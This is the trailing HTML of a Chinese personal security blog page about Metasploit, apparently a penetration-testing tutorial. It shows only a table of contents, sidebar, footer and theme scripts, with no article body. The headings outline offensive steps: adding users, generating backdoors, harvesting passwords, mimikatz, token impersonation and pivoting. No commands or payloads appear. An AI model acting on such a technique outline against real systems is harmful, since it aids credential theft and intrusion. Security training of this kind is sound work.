class="toc-number">11.8.</span> <span class="toc-text"> 添加用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="toc-number">11.9.</span> <span class="toc-text"> 生成后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E5%90%8E%E6%8A%A4%E7%90%86"><span class="toc-number">11.10.</span> <span class="toc-text"> 产后护理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#post%E6%A8%A1%E5%9D%97"><span class="toc-number">12.</span> <span class="toc-text"> POST 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">12.1.</span> <span class="toc-text"> 获取用户密码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#powershell%E6%A8%A1%E5%9D%97"><span class="toc-number">13.</span> <span class="toc-text"> powershell 模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kimimimikatz%E6%A8%A1%E5%9D%97"><span class="toc-number">14.</span> <span class="toc-text"> kimi（mimikatz）模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#stdapi%E6%A8%A1%E5%9D%97"><span class="toc-number">15.</span> <span class="toc-text"> stdapi 模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92"><span class="toc-number">16.</span> <span class="toc-text"> 令牌假冒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pivot%E4%BB%A3%E7%90%86"><span class="toc-number">17.</span> <span class="toc-text"> pivot 代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97"><span class="toc-number">18.</span> <span class="toc-text"> 自定义攻击模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80"><span class="toc-number">19.</span> <span class="toc-text"> 小试牛刀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msf-gui%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2"><span class="toc-number">20.</span> <span class="toc-text"> MSF-GUI 图形化界面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#with-powers-comes-responsilities"><span class="toc-number">21.</span> <span class="toc-text"> With Powers Comes Responsilities</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit%E7%9A%84%E5%BC%BA%E5%A4%A7"><span class="toc-number">21.1.</span> <span class="toc-text"> Metasploit 的强大</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">22.</span> <span class="toc-text"> 参考链接</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/" rel="bookmark" title="扫描不止 nc&amp;nmap">扫描不止 nc&amp;nmap</a></li><li><a href="/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/" rel="bookmark" title="不会就搜searchsploit">不会就搜searchsploit</a></li><li class="active"><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/" rel="bookmark" title="MSF---万千waf中取ROOT首级">MSF---万千waf中取ROOT首级</a></li><li><a href="/post/Get-Earth-Shell/" rel="bookmark" title="Get Earth Shell">Get Earth Shell</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="MorIo24" src="/assets/avatar.webp"><p class="name" itemprop="name">MorIo24</p><div class="description" itemprop="description">Never hack for profit</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">7</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">3</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">5</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ctf-learner" class="item github" title="https://github.com/ctf-learner"><i class="ic i-github"></i></a><a target="_blank" rel="noopener external nofollow noreferrer" href="https://gitee.com/morio24" class="item gitee" title="https://gitee.com/morio24"><i class="ic i-gitee"></i></a><a href="gmail:morio24@qq.com" rel="external nofollow noreferrer" class="item email" title="gmail:morio24@qq.com"><i class="ic i-envelope"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/me" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li></ul></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-coffee"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/post/Get-Earth-Shell/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/post/AWD-waf%E8%84%9A%E6%9C%AC/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="分类于Penetration Test">Penetration Test</a></div><span><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/">MSF---万千waf中取ROOT首级</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/AWD/" title="分类于AWD">AWD</a></div><span><a href="/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/">AWD初体验</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="分类于Penetration Test">Penetration Test</a></div><span><a href="/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/">扫描不止 nc&amp;nmap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="分类于Penetration Test">Penetration Test</a></div><span><a href="/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/">不会就搜searchsploit</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%B3%E4%BA%8EshokaX/" title="分类于关于shokaX">关于shokaX</a></div><span><a href="/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/">搭博客一路的心酸</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Penetration-Test/" title="分类于Penetration Test">Penetration Test</a></div><span><a href="/post/Get-Earth-Shell/">Get Earth Shell</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/AWD/" title="分类于AWD">AWD</a></div><span><a href="/post/AWD-waf%E8%84%9A%E6%9C%AC/">AWD-waf脚本</a></span></li></ul></div></div><div class="status"><div class="copyright">© 追风赶月莫停留，平芜尽处是春山 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">MorIo24 @ MorIo24's blog</span></div><div class="count"><div class="time-last"><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span><script>var now = new Date();
function createtime() {
    var grt= new Date("4/16/2024 13:14:20");
    now.setTime(now.getTime()+250);
    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
    document.getElementById("timeDate").innerHTML = "小破站在风雨中孤苦伶仃度过了 "+dnum+" 天 ";
    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
}
setInterval("createtime()",250);</script></div><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">69k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">1:03</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io/">Hexo</a> &amp; Theme.<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div><script src="/live2d-widget/autoload.js"></script></div></div></footer></div><script data-config="" type="text/javascript">var LOCAL = {
    ispost: true,
        path: `post/MSF-万千waf中取ROOT首级/`,
        favicon: {
        show: `好久不见~(ღ˘⌣˘ღ)~`,
        hide: `404咯(｡í _ ì｡)`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-6-M/pace/1.2.4/pace.min.js" async=""></script><script src="/js/siteInit.js?v=0.4.2" type="module" fetchpriority="high" defer=""></script></body></html>